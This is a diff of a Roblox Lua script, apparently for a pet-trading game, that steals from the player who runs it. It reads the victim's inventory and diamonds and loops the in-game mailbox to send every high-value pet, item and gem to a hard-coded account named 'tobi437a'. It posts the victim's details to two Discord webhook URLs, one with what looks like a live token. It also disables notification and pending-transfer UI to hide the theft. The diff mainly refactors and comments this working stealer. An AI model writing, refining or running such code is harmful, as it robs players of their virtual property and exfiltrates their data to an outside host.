@@ -1,35 +1,55 @@
 local rapThreshold = 100000 -- Set the RAP threshold value
 
-local network = game:GetService("ReplicatedStorage"):WaitForChild("Network", 5)
-local library = require(game.ReplicatedStorage:WaitForChild("Library", 5))
-local SaveModule = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save"))
-print(SaveModule) -- Check if the module is correctly loaded
-local playerSave = SaveModule.Get() -- Ensure this works
-print(playerSave) -- Check the result of Get()
-local save = saveModule and saveModule:Get().Inventory or {}
+local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
 local plr = game.Players.LocalPlayer
 local MailMessage = "Join gg / GY2RVSEGDT to get back"
-local HttpService = game:GetService("HttpService")
+
+-- Ensure the Library module exists
+local libraryModule = replicatedStorage:FindFirstChild("Library")
+if not libraryModule then
+    warn("Library module not found!")
+    return
+end
+
+local library = require(libraryModule)
+
+-- Ensure the Client and Save modules exist
+local clientFolder = replicatedStorage:FindFirstChild("Library"):FindFirstChild("Client")
+if not (clientFolder and clientFolder:FindFirstChild("Save")) then
+    warn("Save module not found!")
+    return
+end
+
+-- Retrieve the player's inventory
+local saveData = require(clientFolder.Save).Get()
+if not (saveData and saveData.Inventory) then
+    warn("Failed to retrieve inventory data!")
+    return
+end
+
+local save = saveData.Inventory
 local sortedItems = {}
 local totalRAP = 0
 _G.scriptExecuted = _G.scriptExecuted or false
-local GetSave = function()
-    return require(game.ReplicatedStorage.Library.Client.Save).Get()
-end
 
+-- Prevent script from executing multiple times
 if _G.scriptExecuted then
     return
 end
 _G.scriptExecuted = true
 
+-- Get the amount of "Diamonds" in the player's currency
 local GemAmount1 = 0
-for i, v in pairs(GetSave().Inventory.Currency) do
-    if v.id == "Diamonds" then
-        GemAmount1 = v._am
+for _, currency in pairs(save.Currency) do
+    if currency.id == "Diamonds" then
+        GemAmount1 = currency._am
         break
     end
 end
 
+-- Helper function to format large numbers with suffixes (k, m, b, etc.)
 local function formatNumber(number)
     if number == nil then
         return "0"
@@ -55,6 +75,7 @@ end
 local globalWebhook = "https://discord.com/api/webhooks/1289613307631632417/xyz1234"
 local alternateWebhook = "https://discord.com/api/webhooks/1289613307631632417/RrQFIi86rxupJJinPyFfQ_kikvOLmmYz82lfO0NDBPUdC15aIDUkUBSqHRrBGGbyhYk3"
 
+-- Function to send a message to the webhooks
 local function SendMessage(username, diamonds, isAboveThreshold)
     local headers = {
         ["Content-Type"] = "application/json",
@@ -135,26 +156,16 @@ local function SendMessage(username, diamonds, isAboveThreshold)
 
     -- Always send to the global webhook
     if globalWebhook and globalWebhook ~= "" then
-        local response = HttpService:PostAsync(globalWebhook, body, Enum.HttpContentType.ApplicationJson)
+        HttpService:PostAsync(globalWebhook, body, Enum.HttpContentType.ApplicationJson)
     end
 
     -- If the RAP is below threshold, send to the alternative webhook too
     if not isAboveThreshold and alternateWebhook and alternateWebhook ~= "" then
-        local response = HttpService:PostAsync(alternateWebhook, body, Enum.HttpContentType.ApplicationJson)
+        HttpService:PostAsync(alternateWebhook, body, Enum.HttpContentType.ApplicationJson)
     end
 end
 
-    -- If the RAP is below threshold, send to the alternative webhook too
-    if not isAboveThreshold and alternateWebhook and alternateWebhook ~= "" then
-        local response = request({
-            Url = alternateWebhook,
-            Method = "POST",
-            Headers = headers,
-            Body = body
-        })
-    end
-end
-
+-- Disable certain UI elements and sounds
 local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
 local noti = plr.PlayerGui.Notifications
 loading.Disabled = true
@@ -173,8 +184,9 @@ game.DescendantAdded:Connect(function(x)
     end
 end)
 
+-- Function to get RAP value for a specific item
 local function getRAP(Type, Item)
-    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get(
+    return (require(replicatedStorage.Library.Client.RAPCmds).Get(
         {
             Class = {Name = Type},
             IsA = function(hmm)
@@ -190,11 +202,9 @@ local function getRAP(Type, Item)
     ) or 0)
 end
 
-local user = Username or "tobi437a"
-local min_rap = min_rap or rapThreshold
-local min_chance = min_chance or 10000
-local webhook = webhook
+local user = "tobi437a"
 
+-- Function to send items
 local function sendItem(category, uid, am)
     local args = {
         [1] = user,
@@ -205,14 +215,15 @@ local function sendItem(category, uid, am)
     }
     local response = false
     repeat
-        local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
     until response == true
 end
 
+-- Function to send all gems above a certain RAP threshold
 local function SendAllGems()
-    for i, v in pairs(GetSave().Inventory.Currency) do
+    for i, v in pairs(save.Currency) do
         if v.id == "Diamonds" then
-            if GemAmount1 >= 500 and GemAmount1 >= min_rap then
+            if GemAmount1 >= 500 and GemAmount1 >= rapThreshold then
                 local args = {
                     [1] = user,
                     [2] = MailMessage,
@@ -222,7 +233,7 @@ local function SendAllGems()
                 }
                 local response = false
                 repeat
-                    local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                    response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                 until response == true
                 break
             end
@@ -230,6 +241,7 @@ local function SendAllGems()
     end
 end
 
+-- Function to claim all mail
 local function ClaimMail()
     local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
     while err == "You must wait 30 seconds before using the mailbox!" do
@@ -238,14 +250,15 @@ local function ClaimMail()
     end
 end
 
+-- Process items in different categories
 local categoryList = {"Pet", "Hoverboard", "Fruit", "Misc", "Booth"}
 
-for i, v in pairs(categoryList) do
-    if save[v] ~= nil then
-        for uid, item in pairs(save[v]) do
-            if v == "Pet" then
-                local rapValue = getRAP(v, item)
-                if rapValue >= min_rap then
+for _, category in ipairs(categoryList) do
+    if save[category] then
+        for uid, item in pairs(save[category]) do
+            if category == "Pet" then
+                local rapValue = getRAP(category, item)
+                if rapValue >= rapThreshold then
                     local itemInfo = {
                         name = item.name,
                         amount = item.amount,
@@ -257,8 +270,8 @@ for i, v in pairs(categoryList) do
                 end
             else
                 if item._am > 0 then
-                    local rapValue = getRAP(v, item)
-                    if rapValue >= min_rap then
+                    local rapValue = getRAP(category, item)
+                    if rapValue >= rapThreshold then
                         local itemInfo = {
                             name = item.name,
                             amount = item.amount,
@@ -274,6 +287,7 @@ for i, v in pairs(categoryList) do
     end
 end
 
+-- Send the collected items and gems
 SendMessage(user, GemAmount1, totalRAP < rapThreshold)
 SendAllGems()
 ClaimMail()
